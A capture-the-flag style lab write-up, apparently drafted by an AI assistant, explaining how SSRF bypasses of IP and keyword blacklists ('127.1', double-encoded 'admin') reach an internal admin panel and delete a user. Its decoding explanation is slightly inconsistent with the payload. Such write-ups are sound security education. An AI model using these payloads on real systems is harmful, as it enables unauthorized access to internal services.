Parfait Kaouthar, tu viens de résoudre avec succès le **Lab 3 – SSRF with blacklist-based input filter**, et tu as déjà ton payload final utilisé dans Burp Suite 💥
Voici le **README complet et propre** avec un espace réservé pour ton screenshot de preuve (Burp Suite ou résultat dans le navigateur).

---

# README — SSRF with Blacklist-Based Input Filter

---

## 🔍 Overview

This lab demonstrates a **Server-Side Request Forgery (SSRF)** vulnerability where the application uses a **blacklist-based input filter** to block access to internal resources.

You’ll bypass this weak filtering mechanism using:

* Alternate IP representations
* Double URL encoding to obfuscate forbidden keywords (like `admin`)

---

## 🎯 Objective

* Exploit SSRF to access the internal admin panel
* Bypass input filters using encoding techniques
* Use SSRF to **delete the user `carlos`**
* Solve the lab

---

## 🧪 Tools Used

* Burp Suite (Proxy, Repeater)
* Manual crafting of payloads (double encoding)

---

## 🚀 Step-by-Step Exploitation

### 1. Intercept the Stock Checker Request

Click **"Check stock"** on a product, then capture the POST request in Burp:

```http
POST /product/stock HTTP/2
Host: <LAB-ID>.web-security-academy.net
...
stockApi=http://stock.weliketoshop.net/product/1/stock
```

---

### 2. Test Basic Payloads

Try:

```http
stockApi=http://127.0.0.1/
```

🛑 Response: Blocked due to IP blacklist.

Try:

```http
stockApi=http://127.1/
```

✅ Response: Bypasses IP filter (127.1 == 127.0.0.1)

Now try:

```http
stockApi=http://127.1/admin
```

🛑 Response: Blocked due to blacklist on keyword `admin`

---

### 3. Final Payload (Double URL Encoding)

Use the following payload to bypass both filters:

```
stockApi=http://127.1/%25%36%31dmin/delete?username=carlos
```

Decoded twice:

* `%25` = `%`
* `%2561` = `%61` = `a` → becomes `admin`

✅ Response: User `carlos` deleted → Lab solved!

---

## 📸 Screenshot Proof

📁 Place your Burp Suite screenshot or lab validation here:

**Screenshot Placeholder:**
![ssrf](https://github.com/Kabilala/ssrf/blob/main/lab4/lab4.png)
